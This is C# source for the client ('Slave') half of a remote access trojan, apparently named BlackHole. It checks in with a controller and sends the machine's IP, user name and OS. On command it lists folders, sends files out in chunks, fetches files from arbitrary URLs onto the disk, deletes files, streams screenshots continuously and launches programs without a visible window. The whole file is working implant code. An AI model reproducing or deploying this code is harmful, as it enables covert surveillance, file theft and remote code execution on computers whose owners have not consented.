﻿using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using NetMQ;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class MasterServer
    {
        public const int DISCONNECTION_TIMEOUT = 8000;
        public const int SEND_INTERVAL = 10;
        public const int RECEIVE_INTERVAL = 10;

        private bool m_capturing = false;
        private CancellationTokenSource m_screenCaptureTokenSource;
        private Stopwatch m_receiveTimer;
        private NetMQContext m_netContext;
        private NetMQSocket m_client;
        private Poller m_poller;
        private ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();
        private string m_serverAddress;
        private bool m_connected = false;
        private long m_lastReceived = -1;

        /// <summary>
        /// 
        /// </summary>
        public MasterServer(NetMQContext context, string serverAddress)
        {
            m_serverAddress = serverAddress;
            m_netContext = context;
            m_client = m_netContext.CreateDealerSocket();
            m_client.Options.Linger = TimeSpan.Zero;
            m_client.ReceiveReady += ClientReceive;

            m_receiveTimer = Stopwatch.StartNew();

            var sendTimer = new NetMQTimer(SEND_INTERVAL);
            sendTimer.Elapsed += SendQueue;

            m_poller = new Poller();
            m_poller.PollTimeout = 10;
            m_poller.AddTimer(sendTimer);
            m_poller.AddSocket(m_client);
            m_poller.PollTillCancelledNonBlocking();
            m_client.Connect(m_serverAddress);
            Send(new GreetTheMasterMessage()
            {
                Ip = Utility.GetWanIp(),
                MachineName = Environment.MachineName,
                UserName = Environment.UserName,
                OperatingSystem = Environment.OSVersion.VersionString
            });
        }        

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SendQueue(object sender, NetMQTimerEventArgs e)
        {
            NetMQMessage message = null;
            var i = m_sendQueue.Count;
            while (i > 0)
            {
                if (m_sendQueue.TryDequeue(out message))
                    m_client.TrySendMultipartMessage(message);
                i--;
            }

            if (m_receiveTimer.ElapsedMilliseconds - m_lastReceived > DISCONNECTION_TIMEOUT && m_connected)
            {
                SetDisconnected();
                Send(new GreetTheMasterMessage()
                {
                    Ip = Utility.GetWanIp(),
                    MachineName = Environment.MachineName,
                    UserName = Environment.UserName,
                    OperatingSystem = Environment.OSVersion.VersionString
                });
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private void SetConnected()
        {
            m_connected = true;
        }

        /// <summary>
        /// 
        /// </summary>
        private void SetDisconnected()
        {
            m_connected = false;
            if (m_capturing)
            {
                m_capturing = false;
                m_screenCaptureTokenSource.Cancel();
            }
            ClearSendQueue();
        }

        /// <summary>
        /// 
        /// </summary>
        private void ClearSendQueue()
        {
            NetMQMessage msg = null;
            while (m_sendQueue.Count > 0)
                m_sendQueue.TryDequeue(out msg);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Send(NetMessage message) => m_sendQueue.Enqueue(new NetMQMessage(new byte[][] { message.Serialize() }));

        /// <summary>
        /// 
        /// </summary>
        private void UpdateLastReceived() => m_lastReceived = m_receiveTimer.ElapsedMilliseconds;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ClientReceive(object sender, NetMQSocketEventArgs e)
        {
            UpdateLastReceived();
            SetConnected();

            var frames = m_client.ReceiveMultipartMessage();
            var message = NetMessage.Deserialize(frames[0].Buffer);
            message.Match()
                .With<DoYourDutyMessage>(DoYourDuty)
                .With<PingMessage>(Ping)
                .With<NavigateToFolderMessage>(NavigateToFolder)
                .With<DownloadFilePartMessage>(DownloadFilePart)
                .With<UploadFileMessage>(UploadFile)
                .With<DeleteFileMessage>(DeleteFile)
                .With<StartScreenCaptureMessage>(StartScreenCapture)
                .With<StopScreenCaptureMessage>(StopScreenCapture)
                .With<ExecuteFileMessage>(ExecuteFile)
                .Default(m =>
                {
                    SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}");
                });
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void SendStatus(int windowId, long operationId, string operation, Exception exception) => SendStatus(windowId, operationId, operation, false, "Failed : " +  exception.ToString());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void SendStatus(int windowId, long operationId, string operation, string message) => SendStatus(windowId, operationId, operation, true, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void SendStatus(int windowId, string operation, string message) => SendStatus(windowId, -1, operation, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void SendFailedStatus(int windowId, string operation, string message) => SendStatus(windowId, -1, operation, false, "Failed : " + message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        /// <param name="message"></param>
        private void SendStatus(int windowId, long operationId, string operation, bool success, string message)
        {
            Send(new StatusUpdateMessage()
            {
                WindowId = windowId,
                OperationId = operationId,
                Operation = operation,
                Success = success,
                Message = message
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DoYourDuty(DoYourDutyMessage message)
        {
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Ping(PingMessage message)
        {
            Send(new PongMessage());
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="windowId"></param>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void ExecuteSimpleOperation(int windowId, long operationId, string operationName, Action operation, string sucessMessage) =>
            Utility.ExecuteComplexOperation(() =>
            {
                operation();
                return true;
            },
            (result) =>
            {
                SendStatus(windowId, operationId, operationName, "Success : " + sucessMessage);
            },
            (error) =>
            {
                SendStatus(windowId, operationId, operationName, error);
            });


        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="messageBuilder"></param>
        private void ExecuteSimpleOperation<T>(int windowId, string operationName, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
            => ExecuteComplexSendOperation(windowId, operationName, operation, (message) =>
            {
                SendStatus(windowId, -1, operationName, "Success : " + messageBuilder(message));
            });

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        private void ExecuteComplexSendOperation<T>(int windowId, string operationName, Func<T> operation) where T : NetMessage
            => ExecuteComplexSendOperation(windowId, operationName, operation, (x) => { });

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        private void ExecuteComplexSendOperation<T>(int windowId, string operationName, Func<T> operation, Action<T> success) where T : NetMessage
            => ExecuteComplexSendOperation(windowId, -1, operationName, operation, success);

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        private void ExecuteComplexSendOperation<T>(int windowId, long operationId, string operationName, Func<T> operation, Action<T> success) where T : NetMessage
            => Utility.ExecuteComplexOperation(operation, (message) =>
            {
                Send(message);
                success(message);
            }, (e) => SendStatus(windowId, operationId, operationName, e));


        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void NavigateToFolder(NavigateToFolderMessage message)
        {
            ExecuteSimpleOperation(message.WindowId, "Folder navigation", 
                () => FileHelper.NavigateToFolder(message.Path, message.Drives), 
                (nav) => $"{nav.Path}");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DownloadFilePart(DownloadFilePartMessage message)
        {
            ExecuteComplexSendOperation(message.WindowId, message.Id, "File download",
                () => FileHelper.DownloadFilePart(message.Id, message.CurrentPart, message.Path),
                (part) =>
                {
                    if (part.CurrentPart == part.TotalPart)
                        SendStatus(message.WindowId, message.Id, "File download", "Successfully downloaded : " + part.Path);
                });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void UploadFile(UploadFileMessage message)
        {
            try
            {
                var client = new WebClient();
                client.DownloadProgressChanged += (s, e) =>
                {
                    // avoid spam by sending only 5 by 5%
                    if (e.ProgressPercentage % 5 == 0)
                    {
                        Send(new UploadProgressMessage()
                        {
                            Id = message.Id,
                            Path = message.Path,
                            Percentage = e.ProgressPercentage,
                            Uri = message.Uri
                        });
                    }
                };
                client.DownloadFileCompleted += (s, e) =>
                {
                    if (e.Error != null)
                    {
                        SendStatus(message.WindowId, message.Id, "File upload (downloading from web)", e.Error);
                    }
                    else
                    {
                        // -1 mean finished
                        Send(new UploadProgressMessage()
                        {
                            Id = message.Id,
                            Path = message.Path,
                            Percentage = -1,
                            Uri = message.Uri
                        });
                    }
                    client.Dispose();
                };
                client.DownloadFileAsync(new Uri(message.Uri), message.Path);                
            }
            catch(Exception e)
            {
                SendStatus(message.WindowId, message.Id, "File upload (downloading from web)", e);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DeleteFile(DeleteFileMessage message)
        {
            ExecuteSimpleOperation(message.WindowId, "File deletion",
                () => FileHelper.DeleteFile(message.FilePath),
                (deletion) => $"{deletion.FilePath}");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void StartScreenCapture(StartScreenCaptureMessage message)
        {
            if (m_capturing)
                return; // dont start multiple tasks
            m_screenCaptureTokenSource = new CancellationTokenSource();

            SendStatus(message.WindowId, "Screen capture", "Started capturing...");
            Task.Factory.StartNew(() => SendCapture(message), m_screenCaptureTokenSource.Token);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private async void SendCapture(StartScreenCaptureMessage message)
        {
            m_capturing = true;
            try
            {
                ExecuteComplexSendOperation(message.WindowId,
                    "Screen capture",
                    () => RemoteDesktopHelper.CaptureScreen(message.ScreenNumber, message.Quality));

                m_screenCaptureTokenSource.Token.ThrowIfCancellationRequested();

                // capture rate FPS
                await Task.Delay(TimeSpan.FromMilliseconds(1000 / message.Rate));

                // continue
                await Task.Factory.StartNew(() => SendCapture(message), m_screenCaptureTokenSource.Token);
            }
            catch(Exception e)
            {
                // cancelled
                m_capturing = false;
                SendStatus(message.WindowId, "Screen capture", "Stopped capturing...");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void StopScreenCapture(StopScreenCaptureMessage message)
        {
            m_screenCaptureTokenSource.Cancel();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void ExecuteFile(ExecuteFileMessage message)
        {
            ExecuteSimpleOperation(message.WindowId, -1, "File execution",
                () =>
                {
                    var startInfo = new ProcessStartInfo()
                    {
                        UseShellExecute = true,
                        FileName = message.FilePath,
                        CreateNoWindow = true,
                    };
                    Process.Start(startInfo);
                }, message.FilePath);
        }
    }
}
